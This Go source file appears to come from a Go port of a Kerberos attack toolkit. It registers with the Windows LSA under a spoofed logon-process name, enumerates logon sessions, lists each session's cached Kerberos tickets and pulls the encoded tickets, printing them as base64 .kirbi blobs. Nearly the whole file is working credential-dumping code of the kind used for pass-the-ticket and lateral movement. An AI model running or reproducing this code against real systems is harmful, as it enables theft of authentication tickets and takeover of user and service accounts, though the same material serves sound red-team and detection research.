package lsa

import (
	"encoding/binary"
	"fmt"
	"log"
	"reflect"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	b64 "encoding/base64"

	"github.com/redt1de/gubeus/heap"
	"golang.org/x/sys/windows"
)

func GetLsaHAndle() (syscall.Handle, error) {
	logonProcessName := "User32LogonProcesss"
	var LSAString LSA_STRING_IN
	var lsaHandle syscall.Handle
	var securityMode uint64

	LSAString.Length = uint16(len(logonProcessName))
	LSAString.MaximumLength = uint16(len(logonProcessName) + 1)
	LSAString.Buffer = logonProcessName

	ret := LsaRegisterLogonProcess(&LSAString, &lsaHandle, &securityMode)

	return lsaHandle, ret
}

func LookupAuthPackage(lsaHandle syscall.Handle) (int, error) {
	name := "kerberos"
	var LSAString LSA_STRING_IN
	var AuthPackage int

	LSAString.Length = uint16(len(name))
	LSAString.MaximumLength = uint16(len(name) + 1)
	LSAString.Buffer = name

	ret := LsaLookupAuthenticationPackage(lsaHandle, &LSAString, &AuthPackage)
	return AuthPackage, ret
}

func GetLogonSessions() ([]LUID, error) {
	var cnt uint32
	var buffer uintptr
	err := LsaEnumerateLogonSessions(&cnt, &buffer)
	if err != nil {
		return nil, err
	}

	var data []LUID
	sh := (*reflect.SliceHeader)(unsafe.Pointer(&data))
	sh.Data = buffer
	sh.Len = int(cnt)
	sh.Cap = int(cnt)
	luids := make([]LUID, cnt)
	for idx := uint32(0); idx < cnt; idx++ {
		luids[idx] = data[idx]
	}

	err = LsaFreeReturnBuffer(buffer)
	if err != nil {
		return nil, err
	}
	return luids, nil
}

func GetLogonSessionData(luid *LUID) (*LogonSessionData, error) {
	var dataBuffer *SECURITY_LOGON_SESSION_DATA
	err := LsaGetLogonSessionData(luid, &dataBuffer)
	if err != nil {
		return nil, err
	}
	sessionData := newLogonSessionData(dataBuffer)

	err = LsaFreeReturnBuffer(uintptr(unsafe.Pointer(dataBuffer)))
	if err != nil {
		return nil, err
	}

	return sessionData, nil
}

func newLogonSessionData(data *SECURITY_LOGON_SESSION_DATA) *LogonSessionData {
	var sid *windows.SID
	if data.Sid != nil {
		sid, _ = data.Sid.Copy()
	}
	return &LogonSessionData{
		UserName:              StringFromLSAString(data.UserName),
		LogonDomain:           StringFromLSAString(data.LogonDomain),
		AuthenticationPackage: StringFromLSAString(data.AuthenticationPackage),
		LogonType:             LogonType(data.LogonType),
		Session:               data.Session,
		Sid:                   sid,
		LogonTime:             TimeFromUint64(data.LogonTime),
		LogonServer:           StringFromLSAString(data.LogonServer),
		DnsDomainName:         StringFromLSAString(data.DnsDomainName),
		Upn:                   StringFromLSAString(data.Upn),
		UserFlags:             data.UserFlags,
		LogonScript:           StringFromLSAString(data.LogonScript),
		ProfilePath:           StringFromLSAString(data.ProfilePath),
		HomeDirectory:         StringFromLSAString(data.HomeDirectory),
		HomeDirectoryDrive:    StringFromLSAString(data.HomeDirectoryDrive),
		LogoffTime:            TimeFromUint64(data.LogoffTime),
		KickOffTime:           TimeFromUint64(data.KickOffTime),
		PasswordLastSet:       TimeFromUint64(data.PasswordLastSet),
		PasswordCanChange:     TimeFromUint64(data.PasswordCanChange),
		PasswordMustChange:    TimeFromUint64(data.PasswordMustChange),
		LastSuccessfulLogon:   TimeFromUint64(data.LastLogonInfo.LastSuccessfulLogon),
		LastFailedLogon:       TimeFromUint64(data.LastLogonInfo.LastFailedLogon),
		FailedAttemptCountSinceLastSuccessfulLogon: data.LastLogonInfo.FailedAttemptCountSinceLastSuccessfulLogon,
	}
}

func StringFromLSAString(s LSA_UNICODE_STRING) string {
	if s.Buffer == 0 || s.Length == 0 {
		return ""
	}
	var data []uint16
	sh := (*reflect.SliceHeader)(unsafe.Pointer(&data))
	sh.Data = s.Buffer
	sh.Len = int(s.Length)
	sh.Cap = int(s.Length)
	return syscall.UTF16ToString(data)
}

func KerbGetValue(sValue uintptr, sLength uint32) []byte {
	if sValue == 0 || sLength == 0 {
		return []byte{}
	}
	var data []byte
	sh := (*reflect.SliceHeader)(unsafe.Pointer(&data))
	sh.Data = sValue
	sh.Len = int(sLength)
	sh.Cap = int(sLength)
	return data
}
func TimeFromUint64(nsec uint64) time.Time {
	if nsec == 0 || nsec == ^uint64(0)>>1 {
		return time.Time{}
	}
	const windowsEpoch = 116444736000000000
	return time.Unix(0, int64(nsec-windowsEpoch)*100)
}

// TODO: needs error checking and lsafreereturnhandle
func GetTicketInfoExS(LsaHandle syscall.Handle, AuthenticationPackage int, luid LUID, sd *LogonSessionData) []KERB_TICKET_CACHE_INFO_EX_OUT {
	var ret []KERB_TICKET_CACHE_INFO_EX_OUT
	var retBufSize int
	var status int
	var respStruct *KERB_QUERY_TKT_CACHE_EX_RESPONSE
	secur32 := windows.NewLazySystemDLL("Secur32.dll")
	var procLsaCallAuthenticationPackage = secur32.NewProc("LsaCallAuthenticationPackage")

	var ticketCacheRequest KERB_QUERY_TKT_CACHE_REQUEST
	ticketCacheRequest.LogonId = luid

	ticketCacheRequest.MessageType = KerbQueryTicketCacheExMessage

	procLsaCallAuthenticationPackage.Call(uintptr(LsaHandle), uintptr(AuthenticationPackage), uintptr(unsafe.Pointer(&ticketCacheRequest)), uintptr(int(unsafe.Sizeof(ticketCacheRequest))), uintptr(unsafe.Pointer(&respStruct)), uintptr(unsafe.Pointer(&retBufSize)), uintptr(unsafe.Pointer(&status)))
	if retBufSize > 8 {

		size := int(respStruct.CountOfTickets)
		p := uintptr(unsafe.Pointer(&respStruct.Tickets))

		var data []KERB_TICKET_CACHE_INFO_EX

		sh := (*reflect.SliceHeader)(unsafe.Pointer(&data))
		sh.Data = p
		sh.Len = size
		sh.Cap = size

		for _, t := range data {
			tmp := KERB_TICKET_CACHE_INFO_EX_OUT{}
			// not sure why, but after unpacking []KERB_TICKET_CACHE_INFO_EX with reflect+unsafe, LSA_UNICODE_STRING are not working right, hence the len/2 lines
			t.ClientName.Length = t.ClientName.Length / 2
			tmp.ClientName = StringFromLSAString(t.ClientName)

			t.ClientRealm.Length = t.ClientRealm.Length / 2
			tmp.ClientRealm = StringFromLSAString(t.ClientRealm)

			t.ServerName.Length = t.ServerName.Length / 2
			tmp.ServerName = string(StringFromLSAString(t.ServerName) + "\x00")

			t.ServerRealm.Length = t.ServerRealm.Length / 2
			tmp.ServerRealm = StringFromLSAString(t.ServerRealm)

			tmp.StartTime = t.StartTime
			tmp.EndTime = t.EndTime
			tmp.RenewTime = t.RenewTime
			tmp.EncryptionType = t.EncryptionType
			tmp.TicketFlags = t.TicketFlags

			ret = append(ret, tmp)

		}

		////////////////////////////////////////////
		err := LsaFreeReturnBuffer(uintptr(unsafe.Pointer(&respStruct)))
		if err != nil {
			fmt.Println("[ERROR] failed to free return buffer in GetTicketInfoEx:", err)
		}
	}
	return ret
}
func GetTicket(LsaHandle syscall.Handle, AuthenticationPackage int, luid LUID, sd *LogonSessionData, targetName string) {
	var request []byte
	var status int
	var retBufSize int
	var respStruct KERB_RETRIEVE_TKT_RESPONSE
	defer LsaFreeReturnBuffer(uintptr((unsafe.Pointer(&respStruct))))

	respStruct = KERB_RETRIEVE_TKT_RESPONSE{}

	secur32 := windows.NewLazySystemDLL("Secur32.dll")
	var procLsaCallAuthenticationPackage = secur32.NewProc("LsaCallAuthenticationPackage")

	cleanTn := strings.Replace(targetName, "\x00", "", -1)
	tn := windows.StringToUTF16(cleanTn)

	runtime.LockOSThread()
	hp, err := heap.GetProcessHeap()
	if err != nil {
		log.Fatal(err)
	}
	hpPtr, err := heap.HeapAlloc(hp, 0x00000008, uintptr(64+len(tn)*2))
	if err != nil {
		log.Fatal(err)
	}
	defer heap.HeapFree(hp, 0, hpPtr)

	request = binary.LittleEndian.AppendUint32(request, KerbRetrieveEncodedTicketMessage)
	request = binary.LittleEndian.AppendUint32(request, luid.LowPart)
	request = binary.LittleEndian.AppendUint32(request, uint32(luid.HighPart))
	request = binary.LittleEndian.AppendUint32(request, 0)
	request = binary.LittleEndian.AppendUint16(request, uint16(len(tn)*2))
	request = binary.LittleEndian.AppendUint16(request, uint16(len(tn))*2)
	request = binary.LittleEndian.AppendUint32(request, 0)
	request = binary.LittleEndian.AppendUint64(request, uint64(hpPtr+64)) // update string pointer to the end of request
	request = binary.LittleEndian.AppendUint32(request, 0)
	request = binary.LittleEndian.AppendUint32(request, 8)
	request = binary.LittleEndian.AppendUint64(request, 0)
	request = binary.LittleEndian.AppendUint64(request, 0)
	request = binary.LittleEndian.AppendUint64(request, 0)
	for _, c := range tn {
		request = binary.LittleEndian.AppendUint16(request, c)
	}

	// fmt.Println(hex.Dump(request))
	// fmt.Println("Request Size:", len(request))
	// fmt.Println("Allocation Size:", 64+len(tn)*2)

	heap.CopyMemory(hpPtr, uintptr(unsafe.Pointer(&request[0])), uint32(len(request)))

	r1, r2, le := procLsaCallAuthenticationPackage.Call(uintptr(LsaHandle), uintptr(AuthenticationPackage),
		hpPtr, uintptr(len(request)), uintptr(unsafe.Pointer(&respStruct)), uintptr(unsafe.Pointer(&retBufSize)), uintptr(unsafe.Pointer(&status)))
	if 1 == 2 {
		syslast := syscall.GetLastError()
		fmt.Println("---------- LsaCallAuthenticationPackage ----------")
		fmt.Println("r1:", r1)
		fmt.Println("r2:", r2)
		fmt.Println("le:", le)
		fmt.Println("lastError:", syslast)
		fmt.Println(LsaNtStatusToWinError(r1))
		fmt.Println("RETBUFSIZE:", retBufSize)
	}
	var newS KERB_EXTERNAL_TICKET
	if retBufSize > 0 {
		newS = *respStruct.Ticket
	} else {
		fmt.Println("[ERROR] retbuf is empty")
	}

	tmp := KerbGetValue(newS.EncodedTicket, uint32(newS.EncodedTicketSize))
	// fmt.Println(hex.Dump(tmp))
	sEnc := b64.StdEncoding.EncodeToString(tmp)
	fmt.Println("\nBase64 Encoded kirbi:")
	fmt.Println(sEnc)
	fmt.Println()

	// err = lsa.LsaFreeReturnBuffer(uintptr((unsafe.Pointer(&respStruct))))
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// err = heap.HeapFree(hp, 0, hpPtr)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	runtime.UnlockOSThread()
}
